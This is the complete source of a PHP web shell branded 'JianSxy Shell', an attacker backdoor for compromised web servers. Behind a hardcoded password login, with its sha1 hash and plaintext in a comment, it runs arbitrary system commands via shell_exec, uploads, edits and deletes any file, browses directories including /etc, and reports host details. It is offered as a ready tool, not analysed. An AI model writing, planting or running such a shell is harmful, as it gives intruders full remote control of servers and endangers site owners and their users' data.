<?php
error_reporting(0);
session_start();

if($_GET['action'] == 'logout') {
    session_destroy();
    header('Location: ?');
    exit;
}

$password = '7c4a8d09ca3762af61e59520943dc26494f8941b'; // sha1('jiansxy')

if(isset($_POST['pass'])) {
    if(sha1($_POST['pass']) == $password) {
        $_SESSION['logged'] = true;
        header('Location: ?');
        exit;
    }
}

if(!isset($_SESSION['logged'])) {
?>
<!DOCTYPE html>
<html>
<head>
    <title>JianSxy - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-box {
            background: rgba(0,0,0,0.9);
            border: 2px solid #0f0;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 50px rgba(0,255,0,0.3);
            text-align: center;
        }
        .login-box h1 {
            color: #f00;
            text-shadow: 0 0 10px #f00;
            margin-bottom: 30px;
            font-size: 36px;
        }
        input[type="password"] {
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 15px;
            width: 300px;
            font-size: 16px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"] {
            background: #0f0;
            border: none;
            color: #000;
            padding: 15px 40px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background: #f00;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>☠️ JianSxy Shell ☠️</h1>
        <form method="POST">
            <input type="password" name="pass" placeholder="Enter Password" autofocus>
            <br>
            <input type="submit" value="LOGIN">
        </form>
    </div>
</body>
</html>
<?php
exit;
}

$cwd = getcwd();
if(isset($_GET['dir'])) {
    $cwd = $_GET['dir'];
    chdir($cwd);
}

function size($file) {
    $size = filesize($file)/1024;
    if($size >= 1024) {
        return round($size/1024,2).' MB';
    }
    return round($size,2).' KB';
}

function perm($file) {
    $p = fileperms($file);
    if(($p & 0xC000) == 0xC000) $i = 's';
    elseif(($p & 0xA000) == 0xA000) $i = 'l';
    elseif(($p & 0x8000) == 0x8000) $i = '-';
    elseif(($p & 0x6000) == 0x6000) $i = 'b';
    elseif(($p & 0x4000) == 0x4000) $i = 'd';
    elseif(($p & 0x2000) == 0x2000) $i = 'c';
    elseif(($p & 0x1000) == 0x1000) $i = 'p';
    else $i = 'u';
    $i .= (($p & 0x0100) ? 'r' : '-');
    $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
    $i .= (($p & 0x0020) ? 'r' : '-');
    $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
    $i .= (($p & 0x0004) ? 'r' : '-');
    $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
    return $i;
}

if(isset($_GET['upload'])) {
    if($_FILES['file']['name'] != '') {
        $upload = move_uploaded_file($_FILES['file']['tmp_name'], $cwd.'/'.$_FILES['file']['name']);
        if($upload) {
            echo "<script>alert('Upload Success!');</script>";
        } else {
            echo "<script>alert('Upload Failed!');</script>";
        }
    }
}

if(isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if(isset($_POST['save'])) {
        file_put_contents($file, $_POST['content']);
        echo "<script>alert('File Saved!'); window.location='?dir=$cwd';</script>";
    }
    $content = htmlspecialchars(file_get_contents($file));
?>
<!DOCTYPE html>
<html>
<head>
    <title>Edit: <?php echo basename($file); ?></title>
    <style>
        * { margin: 0; padding: 0; }
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
        textarea { width: 100%; height: 500px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; font-family: 'Courier New', monospace; font-size: 14px; }
        input[type="submit"] { background: #0f0; border: none; color: #000; padding: 10px 30px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        a { color: #f00; text-decoration: none; margin-left: 10px; }
    </style>
</head>
<body>
    <h2>Edit: <?php echo $file; ?></h2>
    <form method="POST">
        <textarea name="content"><?php echo $content; ?></textarea><br>
        <input type="submit" name="save" value="SAVE">
        <a href="?dir=<?php echo $cwd; ?>">BACK</a>
    </form>
</body>
</html>
<?php
exit;
}

if(isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if(is_dir($file)) {
        rmdir($file);
    } else {
        unlink($file);
    }
    header("Location: ?dir=$cwd");
    exit;
}

if(isset($_GET['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<pre>";
    echo shell_exec($cmd);
    echo "</pre>";
    exit;
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>JianSxy Shell - <?php echo $cwd; ?></title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .header {
            background: rgba(0,0,0,0.9);
            border: 2px solid #0f0;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        .header h1 {
            color: #f00;
            text-shadow: 0 0 10px #f00;
            font-size: 32px;
        }
        .info {
            margin-top: 10px;
            font-size: 12px;
        }
        .info span {
            color: #ff0;
            margin-right: 20px;
        }
        .menu {
            background: rgba(0,0,0,0.9);
            border: 1px solid #0f0;
            padding: 15px;
            margin-bottom: 20px;
        }
        .menu a {
            color: #0f0;
            text-decoration: none;
            margin-right: 20px;
            padding: 5px 15px;
            border: 1px solid #0f0;
            display: inline-block;
            margin-bottom: 5px;
        }
        .menu a:hover {
            background: #0f0;
            color: #000;
        }
        .path {
            background: rgba(0,0,0,0.9);
            border: 1px solid #0f0;
            padding: 15px;
            margin-bottom: 20px;
            word-wrap: break-word;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: rgba(0,0,0,0.9);
        }
        th {
            background: #0f0;
            color: #000;
            padding: 10px;
            text-align: left;
            font-weight: bold;
        }
        td {
            padding: 10px;
            border-bottom: 1px solid #0f0;
        }
        tr:hover {
            background: rgba(0,255,0,0.1);
        }
        a {
            color: #0f0;
            text-decoration: none;
        }
        a:hover {
            color: #ff0;
        }
        .action a {
            color: #f00;
            margin-right: 10px;
        }
        input[type="text"], input[type="file"] {
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 10px;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"] {
            background: #0f0;
            border: none;
            color: #000;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
        }
        .cmd-box {
            background: rgba(0,0,0,0.9);
            border: 1px solid #0f0;
            padding: 20px;
            margin-bottom: 20px;
        }
        .cmd-box input[type="text"] {
            width: 80%;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>☠️ JianSxy Shell v1.0 ☠️</h1>
        <div class="info">
            <span>Uname: <?php echo php_uname(); ?></span>
            <span>User: <?php echo @get_current_user(); ?></span>
            <span>PHP: <?php echo PHP_VERSION; ?></span>
            <span>Server: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></span>
            <span>IP: <?php echo $_SERVER['SERVER_ADDR']; ?></span>
        </div>
    </div>

    <div class="menu">
        <a href="?action=logout">LOGOUT</a>
        <a href="?">HOME</a>
        <a href="?dir=/etc">ETC</a>
        <a href="?dir=/var/www">WWW</a>
        <a href="?dir=/tmp">TMP</a>
    </div>

    <div class="path">
        <strong>Path:</strong> <?php echo $cwd; ?>
    </div>

    <div class="cmd-box">
        <form method="POST" action="?cmd=1">
            <strong>Command:</strong>
            <input type="text" name="cmd" placeholder="ls -la" style="width: 80%;">
            <input type="submit" value="EXEC">
        </form>
    </div>

    <div style="background: rgba(0,0,0,0.9); border: 1px solid #0f0; padding: 20px; margin-bottom: 20px;">
        <form method="POST" enctype="multipart/form-data" action="?upload=1&dir=<?php echo $cwd; ?>">
            <strong>Upload File:</strong>
            <input type="file" name="file">
            <input type="submit" value="UPLOAD">
        </form>
    </div>

    <table>
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Perms</th>
            <th>Modified</th>
            <th>Action</th>
        </tr>
        <?php
        $files = scandir($cwd);
        foreach($files as $file) {
            if($file == '.') continue;
            $path = $cwd.'/'.$file;
            if(is_dir($path)) {
                echo '<tr>';
                echo '<td><a href="?dir='.$path.'">📁 '.$file.'</a></td>';
                echo '<td>DIR</td>';
                echo '<td>'.perm($path).'</td>';
                echo '<td>'.date('Y-m-d H:i', filemtime($path)).'</td>';
                echo '<td class="action"><a href="?delete='.$path.'&dir='.$cwd.'">DELETE</a></td>';
                echo '</tr>';
            }
        }
        foreach($files as $file) {
            if($file == '.' || $file == '..') continue;
            $path = $cwd.'/'.$file;
            if(is_file($path)) {
                echo '<tr>';
                echo '<td>📄 '.$file.'</td>';
                echo '<td>'.size($path).'</td>';
                echo '<td>'.perm($path).'</td>';
                echo '<td>'.date('Y-m-d H:i', filemtime($path)).'</td>';
                echo '<td class="action">';
                echo '<a href="?edit='.$path.'">EDIT</a>';
                echo '<a href="?delete='.$path.'&dir='.$cwd.'">DELETE</a>';
                echo '<a href="'.$path.'" target="_blank">VIEW</a>';
                echo '</td>';
                echo '</tr>';
            }
        }
        ?>
    </table>
</body>
</html>